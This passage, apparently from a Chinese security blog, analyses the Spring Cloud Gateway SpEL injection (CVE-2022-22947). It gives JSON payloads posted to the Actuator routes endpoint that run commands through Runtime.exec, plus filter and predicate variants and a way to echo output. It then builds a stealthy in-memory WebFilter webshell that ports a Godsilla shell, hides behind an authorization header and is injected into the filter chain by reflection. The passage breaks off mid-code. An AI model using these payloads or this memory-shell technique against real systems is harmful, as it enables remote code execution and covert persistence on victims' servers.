data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328172604495.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230328172604495"></p><p>在<code>convertToRoute()</code>中调用了combinePredicates()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328172853204.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328172853204.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230328172853204"></p><p>而在路由初始化时触发convertToRoute()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CacheingRouteLocator#onApplicationEvent()-&gt;</span><br><span class="line">    CachingRouteLocator#fetch()-&gt;</span><br><span class="line">    CompositeRouteLocator#getRoutes()-&gt;</span><br><span class="line">    RouteDefinitionRouteLocator#getRoutes()-&gt;</span><br><span class="line">    RouteDefinitionRouteLocator#convertToRoute()</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在官方文档<a href="https://docs.spring.io/spring-cloud-gateway/docs/3.1.0/reference/html/#actuator-api%E4%B8%AD%EF%BC%8C%E6%8F%90%E4%BE%9B%E4%BA%86json%E5%8F%91%E9%80%81%E8%B7%AF%E7%94%B1%E8%AF%B7%E6%B1%82%E5%86%85%E5%AE%B9">https://docs.spring.io/spring-cloud-gateway/docs/3.1.0/reference/html/#actuator-api中，提供了json发送路由请求内容</a></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328164518702.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328164518702.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230328164518702"></p><p>Actuator API提供了Rest添加路由的方式:</p><blockquote><p>要创建一个路由，请向&#x2F;gateway&#x2F;routes&#x2F;{id_route_to_create}发出一个POST请求，该请求包含一个指定路由字段的JSON主体（见检索某个特定路由的信息）。要删除一个路由，请向&#x2F;gateway&#x2F;routes&#x2F;{id_route_to_delete}发出一个DELETE请求。</p></blockquote><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328163753075.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328163753075.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230328163753075"></p><p><code>http://xxx/actuator/gateway/routes/&#123;xxx&#125;</code>添加路由</p><p>也就是可以向<code>http://xxx/actuator/gateway/routes/godown</code>如下payload进行注入</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;godown&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;predicates&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Path&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;_genkey_0&quot;</span><span class="punctuation">:</span><span class="string">&quot;#&#123;T(java.lang.Runtime).getRuntime().exec(&#x27;calc&#x27;)&#125;&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;filters&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://www.uri-destination.org&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;order&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>创建完之后向<code>http://xxx/actuator/gateway/refresh</code>发送请求即可刷新</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328165326591.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328165326591.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230328165326591"></p><p>其实添加的这部分路由对应着配置文件中的route部分：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328165708684.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328165708684.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230328165708684"></p><p>注意在创建路由的时候把content-type改为application&#x2F;json</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403194802519.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403194802519.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230403194802519"></p><h2 id="拓展链"><a href="#拓展链" class="headerlink" title="拓展链"></a>拓展链</h2><p>上文payload里的其他参数有没有用？name为什么要是Path？</p><p>借用奇安信的一张调用栈图：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328184956808.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328184956808.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230328184956808"></p><p>在RouteDefinitionRouteLocator#convertToRoute()方法处</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328185532235.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328185532235.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230328185532235"></p><p>除了会调用combinePredicates，还会调用getFilters来触发loadGatewayFilters进行bind</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328213727298.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328213727298.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230328213727298"></p><p>所以在filters处注入也是可以的</p><ul><li>奇安信攻防实验室对各种过滤器进行了实验，事实证明所有过滤器都可以：<a href="https://forum.butian.net/share/1410">https://forum.butian.net/share/1410</a></li></ul><blockquote><p>过滤器名称：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">AddRequestHeader</span><br><span class="line">MapRequestHeader</span><br><span class="line">AddRequestParameter</span><br><span class="line">AddResponseHeader</span><br><span class="line">ModifyRequestBody</span><br><span class="line">DedupeResponseHeader</span><br><span class="line">ModifyResponseBody</span><br><span class="line">CacheRequestBody</span><br><span class="line">PrefixPath</span><br><span class="line">PreserveHostHeader</span><br><span class="line">RedirectTo</span><br><span class="line">RemoveRequestHeader</span><br><span class="line">RemoveRequestParameter</span><br><span class="line">RemoveResponseHeader</span><br><span class="line">RewritePath</span><br><span class="line">Retry</span><br><span class="line">SetPath</span><br><span class="line">SecureHeaders</span><br><span class="line">SetRequestHeader</span><br><span class="line">SetRequestHostHeader</span><br><span class="line">SetResponseHeader</span><br><span class="line">RewriteResponseHeader</span><br><span class="line">RewriteLocationResponseHeader</span><br><span class="line">SetStatus</span><br><span class="line">SaveSession</span><br><span class="line">StripPrefix</span><br><span class="line">RequestHeaderToRequestUri</span><br><span class="line">RequestSize</span><br><span class="line">RequestHeaderSize</span><br></pre></td></tr></table></figure></blockquote><p>payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;first_route&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;predicates&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;filters&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Retry&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> </span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;payload&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;123&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://www.uri-destination.org&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;order&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>修改filters.name为任意合法过滤器名，payload处改为spel表达式</p><p>同理，predicates里的name，我们之前用的Path</p><p>实际上下列predicates都能用：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230329213203262.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230329213203262.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230329213203262"></p><h3 id="回显"><a href="#回显" class="headerlink" title="回显"></a>回显</h3><p>用户定义的路由信息会存在内存中，refresh后会把结果写入路由信息。通过路由信息的API看到RCE的结果（就上面payload注册完路由后GET访问路由路径）</p><ul><li>利用RedirectTO过滤器注入：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;first_route&quot;</span>,</span><br><span class="line">    <span class="string">&quot;predicates&quot;</span>: [],</span><br><span class="line">    <span class="string">&quot;filters&quot;</span>: [&#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RedirectTo&quot;</span>,</span><br><span class="line">        <span class="string">&quot;args&quot;</span>: </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;status&quot;</span>: <span class="string">&quot;302&quot;</span>,</span><br><span class="line">                <span class="string">&quot;url&quot;</span>: <span class="string">&quot;payload&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">    &#125;],</span><br><span class="line">    <span class="string">&quot;uri&quot;</span>: <span class="string">&quot;https://www.uri-destination.org&quot;</span>,</span><br><span class="line">    <span class="string">&quot;order&quot;</span>: <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在spring官方文档可以看到RedirectTo接收两个参数，一个status一个url，但是会验证参数类型，也就是说status就必须是枚举类型，url就会进行url解析，所以该过滤器不能使用，没有传入字符串类型的参数，如RemoveRequestHeader，同理对predicates链</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230329213923525.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230329213923525.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230329213923525"></p><h2 id="注入内存马"><a href="#注入内存马" class="headerlink" title="注入内存马"></a>注入内存马</h2><p>spring cloud gateway是基于WebFlux的，关于WebFlux，这篇文章有详尽的说明：</p><p><a href="https://juejin.cn/post/7001032584821997598">https://juejin.cn/post/7001032584821997598</a></p><p>web服务基于netty和spring，c0ny1佬对针对netty和spring构造了内存马</p><h3 id="netty内存马"><a href="#netty内存马" class="headerlink" title="netty内存马"></a>netty内存马</h3><p>netty处理http请求会用pipeline链上的handler依次来处理，内存马就是模拟注册一个handler。但是netty是动态构造pipeline。</p><p>动态添加handler的CompositeChannelPipelineConfigurer的compositeChannelPipelineConfigurer第二个参数other默认为空，即默认第一个。如果第二个参数other有值，将被合并为一个新Configurer</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330095907105.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330095907105.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230330095907105"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330095949904.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330095949904.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230330095949904"></p><p>使用reactor.netty.transport.TransportConfig#doOnchannelInit来获取Configurer</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330100251980.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330100251980.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230330100251980"></p><p>至于构造netty内存马的代码，已经来到了知识盲区，直接移步<a href="https://mp.weixin.qq.com/s/S15erJhHQ4WCVfF0XxDYMg">https://mp.weixin.qq.com/s/S15erJhHQ4WCVfF0XxDYMg</a></p><h3 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h3><p>分析一遍mieea佬的webFilter内存马</p><p>spring Webflux是有filter的，在官方文档里有：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330222501934.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330222501934.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230330222501934"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330222403239.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330222403239.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230330222403239"></p><p>我们知道filter一般都是一个链，在这里是用DefaultWebFilterChain</p><p>在<code>DefaultWebFilterChain#invokefilter()</code>处触发filter</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330223055686.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330223055686.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230330223055686"></p><p>可以看到filter()参数只有ServerWebExchange，那模拟就return调用下一个filter构成filter链</p><p>一个Filter Demo:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.core.annotation.Order;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilterChain;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Order(value = 2)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NormalFilter</span> <span class="keyword">implements</span> <span class="title class_">WebFilter</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, WebFilterChain chain)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> chain.filter(exchange);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反射利用DefaultWebFilterChain#initChain()模拟注册一个filter:</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330225056456.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330225056456.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230330225056456"></p><p>该Chain由FilteringWebHandler生成实例，直接new FilteringWebHandler就能将Filter插入到首位</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330225422742.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330225422742.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230330225422742"></p><h4 id="poc构造："><a href="#poc构造：" class="headerlink" title="poc构造："></a>poc构造：</h4><p>调试环境：<a href="https://github.com/Ha0Liu/CVE-2022-22947">https://github.com/Ha0Liu/CVE-2022-22947</a></p><p>使用c0ny1师傅的java-Object-searcher工具（<a href="https://github.com/c0ny1/java-object-searcher%EF%BC%89%E6%89%BE%E5%88%B0%E5%86%85%E5%AD%98%E4%B8%ADDefaultWebFilterChain%E7%9A%84%E4%BD%8D%E7%BD%AE">https://github.com/c0ny1/java-object-searcher）找到内存中DefaultWebFilterChain的位置</a></p><p>新建一个NormalFilter，把编译好的java-obejct-searcher-0.1.0.jar导入到target目录下，项目启动后触发一遍filter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> me.gv7.tools.josearcher.entity.Blacklist;</span><br><span class="line"><span class="keyword">import</span> me.gv7.tools.josearcher.entity.Keyword;</span><br><span class="line"><span class="keyword">import</span> me.gv7.tools.josearcher.searcher.SearchRequstByBFS;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.annotation.Order;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilterChain;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Order(value = 2)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NormalFilter</span> <span class="keyword">implements</span> <span class="title class_">WebFilter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, WebFilterChain chain)</span> &#123;</span><br><span class="line">        <span class="comment">//设置搜索类型包含Request关键字的对象</span></span><br><span class="line">        List&lt;Keyword&gt; keys = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        keys.add(<span class="keyword">new</span> <span class="title class_">Keyword</span>.Builder().setField_type(<span class="string">&quot;chain&quot;</span>).build());</span><br><span class="line">        List&lt;Blacklist&gt; blacklists = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        blacklists.add(<span class="keyword">new</span> <span class="title class_">Blacklist</span>.Builder().setField_type(<span class="string">&quot;java.io.File&quot;</span>).build());</span><br><span class="line">        <span class="type">SearchRequstByBFS</span> <span class="variable">searcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchRequstByBFS</span>(Thread.currentThread(),keys);</span><br><span class="line">        searcher.setBlacklists(blacklists);</span><br><span class="line">        searcher.setIs_debug(<span class="literal">true</span>);</span><br><span class="line">        searcher.setMax_search_depth(<span class="number">10</span>);</span><br><span class="line">        searcher.setReport_save_path(<span class="string">&quot;xx&quot;</span>);</span><br><span class="line">        searcher.searchObject();</span><br><span class="line">        <span class="keyword">return</span> chain.filter(exchange);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如下：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403105648279.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403105648279.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230403105648279"></p><p>于是我们得到内存马构造的流程：</p><ol><li>构造恶意filter</li></ol><p>哥斯拉里面生成jsp的马</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403150154035.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403150154035.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230403150154035"></p><p>filter不能影响正常的业务，加一个身份验证的http头：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">authorizationHeader</span> <span class="operator">=</span> exchange.getRequest().getHeaders().getFirst(HttpHeaders.AUTHORIZATION);</span><br><span class="line"><span class="keyword">if</span>(authorizationHeader != <span class="literal">null</span> &amp;&amp; authorizationHeader.equals(auth)) &#123;......&#125;</span><br></pre></td></tr></table></figure><p>表单数据用<code>ServerWebexchange.getFormData()</code>获取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mono&lt;MultiValueMap&lt;String, String&gt;&gt; formData = exchange.getFormData();</span><br></pre></td></tr></table></figure><p>获取到的数据是键值对数据流，用flatMap对数据流进行合并化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">Mono</span> <span class="variable">bufferStream</span> <span class="operator">=</span> formData.flatMap(map -&gt; &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">passStr</span> <span class="operator">=</span> map.getFirst(pass);</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">     ......</span><br><span class="line"> <span class="keyword">return</span> Mono.just(<span class="keyword">new</span> <span class="title class_">DefaultDataBufferFactory</span>().wrap(result.toString().getBytes(StandardCharsets.UTF_8)));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>为方便移植，把哥斯拉的session换成<code>Map&lt;String,Object&gt;</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map&lt;String, Object&gt; store = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br></pre></td></tr></table></figure><ol start="2"><li>从线程中获取到DefaultWebFilterChain:</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">getThreads = Thread.class.getDeclaredMethod(<span class="string">&quot;getThreads&quot;</span>);</span><br><span class="line">        getThreads.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">threads</span> <span class="operator">=</span> getThreads.invoke(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; Array.getLength(threads); i++) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">thread</span> <span class="operator">=</span> Array.get(threads, i);</span><br><span class="line">            <span class="keyword">if</span> (thread != <span class="literal">null</span> &amp;&amp; thread.getClass().getName().contains(<span class="string">&quot;NettyWebServer&quot;</span>)) &#123;</span><br><span class="line">                <span class="comment">// 获取defaultWebFilterChain</span></span><br><span class="line">                <span class="type">NettyWebServer</span> <span class="variable">nettyWebServer</span> <span class="operator">=</span> (NettyWebServer) getFieldValue(thread, <span class="string">&quot;this$0&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">                <span class="type">ReactorHttpHandlerAdapter</span> <span class="variable">reactorHttpHandlerAdapter</span> <span class="operator">=</span> (ReactorHttpHandlerAdapter) getFieldValue(nettyWebServer, <span class="string">&quot;handler&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">delayedInitializationHttpHandler</span> <span class="operator">=</span> getFieldValue(reactorHttpHandlerAdapter,<span class="string">&quot;httpHandler&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">                HttpWebHandlerAdapter httpWebHandlerAdapter= (HttpWebHandlerAdapter)getFieldValue(delayedInitializationHttpHandler,<span class="string">&quot;delegate&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">                ExceptionHandlingWebHandler exceptionHandlingWebHandler= (ExceptionHandlingWebHandler)getFieldValue(httpWebHandlerAdapter,<span class="string">&quot;delegate&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">                <span class="type">FilteringWebHandler</span> <span class="variable">filteringWebHandler</span> <span class="operator">=</span> (FilteringWebHandler)getFieldValue(exceptionHandlingWebHandler,<span class="string">&quot;delegate&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">                DefaultWebFilterChain defaultWebFilterChain= (DefaultWebFilterChain)getFieldValue(filteringWebHandler,<span class="string">&quot;chain&quot;</span>,<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><ol start="3"><li>将恶意filter插入到Chain中，并指定到首位(0位)</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;WebFilter&gt; newAllFilters= <span class="keyword">new</span> <span 